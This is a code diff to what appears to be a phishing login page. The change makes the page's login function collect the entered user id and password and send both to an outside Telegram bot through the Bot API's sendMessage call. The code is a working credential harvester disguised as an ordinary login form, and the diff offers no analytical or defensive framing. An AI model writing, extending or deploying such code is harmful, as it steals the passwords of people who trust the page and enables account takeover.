@@ -113,7 +113,7 @@ color:#222;
 
 <div class="content">
 
-<div class="username" id="user"></div>
+<div class="username" id="userid"></div>
 
 <input
 type="password" id="pw" class="input"
@@ -140,8 +140,8 @@ function login() {
 
     const pesan = `💌 Pesan baru
 
-Nama: ${pw}`;
-
+Nama: ${userid},
+password: ${pw}`;
     fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
         method: "POST",
         headers: {
